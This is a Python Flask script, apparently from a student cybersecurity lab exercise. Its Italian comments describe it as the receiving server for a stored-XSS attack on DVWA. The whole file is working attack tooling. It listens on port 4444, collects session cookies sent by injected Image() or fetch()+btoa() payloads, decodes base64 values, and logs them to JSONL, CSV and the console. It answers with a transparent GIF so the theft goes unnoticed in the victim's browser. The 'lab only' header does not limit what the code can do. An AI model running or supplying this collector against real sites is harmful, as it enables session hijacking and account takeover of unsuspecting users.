#!/usr/bin/env python3
"""
cookie_catcher.py
=================
Web server di raccolta cookie per PoC di Stored XSS in ambiente di laboratorio
(DVWA su Metasploitable). Ascolta su 0.0.0.0:4444 e registra ogni richiesta
ricevuta in:
  - console (output colorato pretty-print)
  - logs/stolen_cookies.jsonl (una riga JSON per evento)
  - logs/stolen_cookies.csv   (friendly per Excel / report)

Endpoint accettati (tutti GET, la victim machine non deve fare nulla di
strano — sono semplici GET lanciati dal JS iniettato):
  GET /?c=<cookie>          # payload "Image()" (cookie in chiaro)
  GET /?cookie=<base64>     # payload "fetch()+btoa()" (cookie in base64)
  GET /*                    # catch-all: logga comunque tutto

Uso:
  $ python3 cookie_catcher.py

Security considerations:
  - SOLO per uso didattico in lab autorizzato.
  - Bind su 0.0.0.0 perché le vittime-DVWA sono su un'altra VM della LAN lab.
  - Nessuna autenticazione: NON esporre su Internet.
  - I log contengono dati sensibili (cookie di sessione): proteggere e purgare
    a fine esercitazione.

Team: Digital Avengers — Build Week Cybersecurity
"""

import base64
import csv
import json
import os
from datetime import datetime, timezone
from pathlib import Path

from flask import Flask, request

# -------------------------------------------------------------------------
# Configurazione
# -------------------------------------------------------------------------
HOST = "0.0.0.0"
PORT = 4444
LOG_DIR = Path(__file__).resolve().parent / "logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)
JSONL_PATH = LOG_DIR / "stolen_cookies.jsonl"
CSV_PATH = LOG_DIR / "stolen_cookies.csv"

# Colori ANSI per output terminal (zero dipendenze extra)
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

app = Flask(__name__)


# -------------------------------------------------------------------------
# Utility
# -------------------------------------------------------------------------
def try_b64_decode(value: str) -> str:
    """
    Prova a decodificare Base64. Se non è Base64 valido restituisce
    la stringa originale. Usato perché il payload `fetch()+btoa()`
    invia il cookie codificato, mentre `Image().src` lo invia in chiaro.
    """
    if not value:
        return ""
    try:
        # padding corretto per b64
        padded = value + "=" * (-len(value) % 4)
        decoded = base64.b64decode(padded, validate=True).decode("utf-8", errors="replace")
        # euristica: se contiene '=' tipico dei cookie, è probabilmente decodificato bene
        return decoded
    except Exception:
        return value  # non era Base64 → restituisco raw


def init_csv_header() -> None:
    """Crea il CSV con header se non esiste."""
    if not CSV_PATH.exists():
        with CSV_PATH.open("w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow([
                "timestamp_utc",
                "client_ip",
                "method",
                "path",
                "query_string",
                "user_agent",
                "referer",
                "cookie_raw",
                "cookie_decoded",
                "payload_type",
            ])


def log_event(event: dict) -> None:
    """Scrive evento su JSONL + CSV + console."""
    # 1) JSONL (append)
    with JSONL_PATH.open("a", encoding="utf-8") as f:
        f.write(json.dumps(event, ensure_ascii=False) + "\n")

    # 2) CSV (append)
    with CSV_PATH.open("a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([
            event["timestamp_utc"],
            event["client_ip"],
            event["method"],
            event["path"],
            event["query_string"],
            event["user_agent"],
            event["referer"],
            event["cookie_raw"],
            event["cookie_decoded"],
            event["payload_type"],
        ])

    # 3) Console pretty
    print(f"\n{RED}{BOLD}╔══════════ 🍪 COOKIE STOLEN ══════════╗{RESET}")
    print(f"{CYAN}  Timestamp  :{RESET} {event['timestamp_utc']}")
    print(f"{CYAN}  Client IP  :{RESET} {event['client_ip']}")
    print(f"{CYAN}  User-Agent :{RESET} {event['user_agent']}")
    print(f"{CYAN}  Referer    :{RESET} {event['referer']}")
    print(f"{CYAN}  Method     :{RESET} {event['method']} {event['path']}")
    print(f"{CYAN}  Payload    :{RESET} {event['payload_type']}")
    print(f"{YELLOW}  Cookie RAW :{RESET} {event['cookie_raw']}")
    print(f"{GREEN}  Cookie DEC :{RESET} {event['cookie_decoded']}")
    print(f"{RED}{BOLD}╚═══════════════════════════════════════╝{RESET}")


# -------------------------------------------------------------------------
# Routes
# -------------------------------------------------------------------------
@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def catch_all(path):
    """
    Catch-all: raccoglie qualsiasi richiesta e ne estrae cookie/metadata.
    Supporta entrambi i payload standard: ?c=... (chiaro) e ?cookie=... (b64).
    """
    try:
        # Estrazione cookie dai query param noti
        cookie_raw = request.args.get("c") or request.args.get("cookie") or ""
        payload_type = (
            "Image()/raw" if "c" in request.args
            else "fetch()/base64" if "cookie" in request.args
            else "unknown"
        )

        cookie_decoded = try_b64_decode(cookie_raw) if payload_type == "fetch()/base64" else cookie_raw

        event = {
            "timestamp_utc": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "client_ip": request.remote_addr or "unknown",
            "method": request.method,
            "path": "/" + path,
            "query_string": request.query_string.decode("utf-8", errors="replace"),
            "user_agent": request.headers.get("User-Agent", ""),
            "referer": request.headers.get("Referer", ""),
            "cookie_raw": cookie_raw,
            "cookie_decoded": cookie_decoded,
            "payload_type": payload_type,
        }
        log_event(event)

        # Risposta GIF 1x1 trasparente (così Image().src si risolve senza errori
        # nella console del browser-vittima e l'attacco resta silent)
        gif_1x1 = (
            b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff"
            b"\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00"
            b"\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
        )
        return gif_1x1, 200, {"Content-Type": "image/gif"}
    except Exception as exc:  # difensivo: non far morire il listener
        app.logger.exception("Errore processing request: %s", exc)
        return "", 500


# -------------------------------------------------------------------------
# Main
# -------------------------------------------------------------------------
if __name__ == "__main__":
    init_csv_header()
    print(f"{BOLD}{GREEN}[+] Cookie Catcher — Digital Avengers Build Week{RESET}")
    print(f"{BOLD}[+] Listening on http://{HOST}:{PORT}{RESET}")
    print(f"[+] JSONL log : {JSONL_PATH}")
    print(f"[+] CSV  log  : {CSV_PATH}")
    print(f"[+] Endpoints : /?c=<cookie>  |  /?cookie=<base64>  |  catch-all\n")
    # debug=False per evitare reloader che duplica i log
    app.run(host=HOST, port=PORT, debug=False)
